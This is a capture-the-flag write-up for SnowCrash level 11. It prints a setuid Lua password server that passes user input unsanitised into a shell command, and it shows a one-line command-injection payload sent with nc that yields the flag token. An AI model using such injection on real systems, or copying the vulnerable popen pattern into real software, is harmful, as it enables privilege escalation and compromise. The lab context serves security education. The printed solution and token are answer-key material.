For this level we look at the file we got.

	level11@SnowCrash:~$ ls -la
	-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

This is the interesting file.
We can read its content.

	#!/usr/bin/env lua
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	function hash(pass)
	  prog = io.popen("echo "..pass.." | sha1sum", "r")
	  data = prog:read("*all")
	  prog:close()

	  data = string.sub(data, 1, 40)

	  return data
	end


	while 1 do
	  local client = server:accept()
	  client:send("Password: ")
	  client:settimeout(60)
	  local l, err = client:receive()
	  if not err then
		  print("trying " .. l)
		  local h = hash(l)

		  if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
			  client:send("Erf nope..\n");
		  else
			  client:send("Gz you dumb*\n")
		  end

	  end

	  client:close()
	end


This script (level11.lua) is a simple password-checking server that:

Listens on port 5151 on localhost (127.0.0.1)
Accepts incoming connections from clients
Prompts for a password with "Password: "
Hashes the provided password using SHA-1 by executing a shell command with io.popen()
Compares the hash to a hardcoded value: "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0"

We tried to reverse the sha1 string that is used to compare 
But it is the string "NotSoEasy" and it is not working.

Responds with either "Erf nope.." (if incorrect) or "Gz you dumbl" (if correct)
Closes the connection after each attempt


The key vulnerability is in the hash() function, which directly concatenates user input into a shell command without sanitization, creating a command injection vulnerability.

The file has setuid permissions and is owned by user flag11, meaning it runs with that user's privileges when executed.

So we need to send to the 5151 port the command that we need to execute.

	level11@SnowCrash:~$ nc localhost 5151
	Password: ; getflag > /tmp/file
	Erf nope..
	level11@SnowCrash:~$ cat /tmp/file
	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Here we have the flag.
